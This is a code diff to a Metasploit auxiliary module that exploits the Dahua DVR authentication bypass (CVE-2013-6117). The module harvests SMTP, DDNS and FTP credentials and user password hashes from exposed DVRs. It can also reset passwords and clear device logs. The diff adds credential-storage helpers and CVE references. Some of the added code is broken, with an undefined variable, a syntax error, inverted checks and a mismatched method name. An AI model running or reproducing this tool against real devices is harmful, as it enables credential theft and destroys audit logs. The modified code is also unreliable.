@@ -1,4 +1,3 @@
-require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
         include Msf::Exploit::Remote::Tcp
         include Msf::Auxiliary::Scanner
@@ -9,18 +8,26 @@ class Metasploit3 < Msf::Auxiliary
                         'Name'           => 'Dahua DVR Auth Bypas Scanner',
                         'Version'        => '$Revision: 1 $',
                         'Description'    => 'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user\'s password and clears the device logs',
-                        'Author'         => 'Jake Reynolds - Depth Security',
+                        'Author'         => [
+                                              'Jake Reynolds - Depth Security', #Vulnerability Discoverer
+                                              'Tyler Bennett - Talos Infosec' # Metasploit Module
+                                            ],
+                       'References'      =>
+                                          [
+                                            [ 'CVE', '2013-6117' ],
+                                            [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
+                                          ],
                         'License'        => MSF_LICENSE
                 )
 		deregister_options('RHOST')
                 register_options(
-                        [
- 				OptString.new('USERNAME', [true, 'A username to reset', '888888']),
- 				OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
-				OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
-				OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
-                                Opt::RPORT(37777)
-                        ], self.class)
+                [
+ 		  OptString.new('USERNAME', [true, 'A username to reset', '888888']),
+ 		  OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
+		  OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
+		  OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
+                  Opt::RPORT(37777)
+                ], self.class)
         end
 
         def run_host(ip)
@@ -50,6 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 			      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
 			      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                
 		user = "root"
 		pass = " w"
 		user8pwhash = "4WzwxXxM" #888888
@@ -88,9 +96,14 @@ class Metasploit3 < Msf::Auxiliary
 					if !data[5].nil? and !data[6].nil?
 						print_good("	SMTP User: #{data[5]}") if !data[5].nil?
 						print_good("	SMTP Password: #{data[6]}") if !data[6].nil?
-						report_auth_info(:host => mailhost[0], :port => mailhost[1], :user => data[5], 
-						                 :pass => data[6], :type => "Mail", :active => true) if ( !mailhost[0].nil? and 
-								 !mailhost[1].nil? and !data[5].nil? and !data[6].nil? )
+                                                muser = "#{data[5]}"
+                                                mpass = "#{data[6]}"
+                                                mailserver = "#{mailhost[0]}"
+                                                print_good("MailServer: #{mailserver}")
+                                                #destemail = "#{data[1]}" if !mailhost[1].nil?
+                                                if !mailserver.to_s.strip.length == 0 and !muser.to_s.strip.length == 0 and !mpass.to_s.strip.length == 0 
+						   report_email_creds(mailserver, rport, muser, mpass) if ( !mailserver.nil? and !muser.nil? and !mpass.nil? )
+                                                end          
 					end
 				end
 			end
@@ -102,16 +115,25 @@ class Metasploit3 < Msf::Auxiliary
 					|val, index|
 					if index > 0
 						val = val.split("&&")
+                                                ddns_service = "#{val[0]}"
+                                                ddns_server = "#{val[1]}"
+                                                ddns_port = "#{val[2]}"
+                                                ddns_domain = "#{val[3]}"
+                                                ddns_user = "#{val[4]}"
+                                                ddns_pass = "#{val[5]}"
 						print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-						print_status("	DDNS Service: #{val[0]}") if !val.nil?
-						print_status("	DDNS Server:  #{val[1]}") if !val.nil?
-						print_status("	DDNS Port: #{val[2]}") if !val.nil?
-						print_status("	Domain: #{val[3]}") if !val.nil?
-						print_good("	Username: #{val[4]}") if !val.nil?
-						print_good("	Password: #{val[5]}") if !val.nil?
-						report_auth_info(:host => val[1], :port => val[2], :user => val[4], :pass => val[5], :type => "DDNS", 
-								:active => true) if ( !val[1].nil? and !val[2].nil? and !val[4].nil? and !val[5].nil? )
-					end
+						print_status("	DDNS Service: #{ddns_service}") if !val.nil?
+						print_status("	DDNS Server:  #{ddns_server}") if !val.nil?
+						print_status("	DDNS Port: #{ddns_port}") if !val.nil?
+						print_status("	Domain: #{ddns_domain}") if !val.nil?
+						print_good("	Username: #{ddns_user}") if !val.nil?
+						print_good("	Password: #{ddns_pass}") if !val.nil?
+                                                if !ddns_server.to_s.strip.length == 0 and !ddns_port.to_s.strip.length == 0 and !ddns_user.to_s.strip.length == 0 and !ddns_pass.to_s.strip.length == 0
+
+						    #report_ddns_cred(:host => val[1], :port => val[2], :user => val[4], :pass => val[5], :type => "DDNS", :active => true) if ( !val[1].nil? and !val[2].nil? and !val[4].nil? and !val[5].nil? )
+					             report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
+                                                end
+                                        end
 				
 				}
 			end
@@ -132,8 +154,10 @@ class Metasploit3 < Msf::Auxiliary
 					ftppass = $2
 					print_good("	FTP User: #{ftpuser}")
 					print_good("	FTP Password: #{ftppass}")
-					#report_auth_info(:host => server, :port => port, :user => ftpuser, :pass => ftppass, :type => "FTP", 
-						  #:active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )
+                                        if !ftpuser..to_s.strip.length == 0 and ftppass.to_s.strip.length == 0
+					report_creds(:host => server, :port => port, :user => ftpuser, :pass => ftppass, :type => "FTP", 
+						         :active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )
+                                        end
 				end
 			end
 			
@@ -154,7 +178,25 @@ class Metasploit3 < Msf::Auxiliary
 				data.each { 
 					|val| 
 					usercount += 1
-					print_status("	#{val[/(([\d]+)[:]([[:print:]]+))/]}")
+                                        pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
+                                        value = pass.split(":")
+                                        username = "#{value[1]}"
+                                        md5hash = "#{value[2]}"
+                                        print_status("	#{val[/(([\d]+)[:]([[:print:]]+))/]}")
+                                        # Write the dahua hash to the database
+                                        hash = "#{rhost} #{username}:$dahua$#{md5hash}"
+                                        report_hash(ip, rport, user, hash)
+                                        # Write the vulnerability to the database
+                                        #unless reported_vuln
+                                        report_vuln(
+                                            :host  => rhost,
+                                            :port  => rport,
+                                            :proto => 'tcp',
+                                            :sname => 'dvr',
+                                            :name  => 'Dahua Authentication Password Hash Exposure',
+                                            :info  => "Obtained password hash for user #{username}: #{md5hash}",
+                                            :refs  => self.references
+                                        )
 				}
 			end
 			sock.put(groups)
@@ -266,5 +308,87 @@ class Metasploit3 < Msf::Auxiliary
 			disconnect()
 		end
         end
+ 
+             
+        def report_hash(ip, rport, user, hash)
+            service_data = {
+                address: ip,
+                port: rport,
+                service_name: 'dahua_dvr',
+                protocol: 'tcp',
+                workspace_id: myworkspace_id
+              }
+
+ 
+            credential_data = {
+                module_fullname: self.fullname,
+                origin_type: :service,
+                private_data: hash,
+                private_type: :nonreplayable_hash,
+                jtr_format: 'dahua_hash',
+                username: user,
+             }.merge(service_data)
+
+            login_data = {
+               core: create_credential(credential_data),
+               status: Metasploit::Model::Login::Status::UNTRIED
+            }.merge(service_data)
+
+         create_credential_login(login_data)
+       end
+       
+       def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
+            service_data = {
+                address: ddns_server,
+                port: ddns_port,
+                service_name: 'ddns settings',
+                protocol: 'tcp',
+                workspace_id: myworkspace_id
+              }
+
+
+            credential_data = {
+                module_fullname: self.fullname,
+                origin_type: :service,
+                private_data: ddns_pass,
+                private_type: :password,
+                username: ddn_user,
+             }.merge(service_data)
+
+            login_data = {
+                 core: create_credential(credential_data),
+                 status: Metasploit::Model::Login::Status::UNTRIED
+             }.merge(service_data)
+
+        create_credential_login(login_data)
+      end
+
+
+
+       def report_email_cred(mailserver, rport, muser, mpass)
+            service_data = {
+                address: mailserver,
+                port: rport,
+                service_name: 'email settings',
+                protocol: 'tcp',
+                workspace_id: myworkspace_id
+              }
+
+
+            credential_data = {
+                module_fullname: self.fullname,
+                origin_type: :service,
+                private_data: mpass,
+                private_type: :password,
+                username: muser,
+             }.merge(service_data)
+
+            login_data = {
+                 core: create_credential(credential_data),
+                 status: Metasploit::Model::Login::Status::UNTRIED
+             }.merge(service_data)
+
+        create_credential_login(login_data)
+      end
 
 end
